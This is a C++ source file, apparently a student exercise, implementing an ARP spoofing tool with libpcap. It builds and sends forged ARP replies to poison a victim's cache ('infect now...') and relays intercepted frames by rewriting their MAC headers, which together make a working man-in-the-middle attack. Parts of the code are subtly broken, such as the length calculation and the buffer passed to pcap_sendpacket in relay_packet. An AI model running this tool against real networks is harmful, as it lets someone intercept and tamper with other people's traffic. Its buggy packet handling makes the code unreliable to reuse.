#include "arp.h"


extern const char** sender_ip;
extern const char** target_ip;
extern const Mac my_macaddr;
extern const Ip my_ipaddr;
extern const Mac* sender_mac;
extern const Mac* target_mac;


void send_arp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, ArpHdr::Operation todo, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(todo);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

EthArpPacket recv_arp(pcap_t* handle, Ip send_ip){
	EthArpPacket *packet;
	struct pcap_pkthdr* header;
	const u_char * pkt_data ;
	int res;
    int cnt = 0;
	while((res=pcap_next_ex(handle, &header,&pkt_data))>=0){
		if(res == 0)
			continue;
		packet = (EthArpPacket*)pkt_data;
		if(packet -> eth_.type_ == htons(EthHdr::Arp) && packet -> arp_.op_ == htons(ArpHdr::Reply) && packet -> arp_.sip_ == Ip(htonl(send_ip))){
			break;
		}
        cnt++;
        if(cnt > 5){
            send_arp(handle,Mac(MAC_BROADCAST),my_macaddr,ArpHdr::Request,my_macaddr,my_ipaddr,Mac(MAC_NULL),send_ip);
            cnt = 0;
        }
	}
	return *packet;
}


Ip my_ip(const char* interface) {
    struct ifreq ifr;
    char ipstr[40];
    int s;
 
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("[*] Error");
        close(s);
        exit(0);
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
        printf("[*] my ip : %s\n", ipstr);
        close(s);
        return Ip(ipstr);
    }
 
    return 0;
}

Mac my_mac(const char* interface){
    struct ifreq ifr;
    char mac_addr[32]; 
    int s;
 
    s = socket(AF_INET, SOCK_STREAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
 
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        printf("[*] Error");
        close(s);
        exit(0);
    } else {
    	for (int i=0; i<MAC_ALEN; i++) 
            sprintf(&mac_addr[i*3],"%02x:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
        mac_addr[MAC_ALEN*3 - 1]='\0';
    	
    	printf("[*] my mac : %s\n", mac_addr);
    	close(s);
        return Mac(mac_addr);
    }
 
    return 0;
}

Mac get_mac_addr(pcap_t* handle, char* ipaddr){
    send_arp(handle,Mac(MAC_BROADCAST),my_macaddr,ArpHdr::Request,my_macaddr,my_ipaddr,Mac(MAC_NULL),Ip(ipaddr));
    EthArpPacket packet = recv_arp(handle,Ip(ipaddr));
    return Mac(packet.arp_.smac_);
}

void arp_spoof_init(pcap_t* handle, int idx){
    printf("[*] infect now...\n");
    printf("\t[*] sender%d : %s target%d : %s\n", idx+1, sender_ip[idx], idx+1, target_ip[idx]);
    send_arp(handle,sender_mac[idx] ,my_macaddr,ArpHdr::Reply,my_macaddr,Ip(target_ip[idx]),sender_mac[idx] ,Ip(sender_ip[idx]));
    printf("[*] infect success!\n");
}



void relay_packet(pcap_t *handle, packet_info* packet, int idx){
    int len = ntohs(*((uint16_t*)(packet + 16)));
    len += 18;
    memcpy(packet -> ethernet.ether_dhost, &(target_mac[idx]),6);
    memcpy(packet -> ethernet.ether_shost, &my_macaddr, 6);
    for(int i=0; i<6; i++){
        if(i == 5){
            printf("%x\n", (packet -> ethernet.ether_shost)[i]);
            break;
        }
        printf("%x.", (packet -> ethernet.ether_shost)[i]);
    }
   // printf("%lx\n",*(packet -> ethernet.ether_dhost));
    //printf("%lx\n",packet -> ethernet.ether_shost);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), len);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}






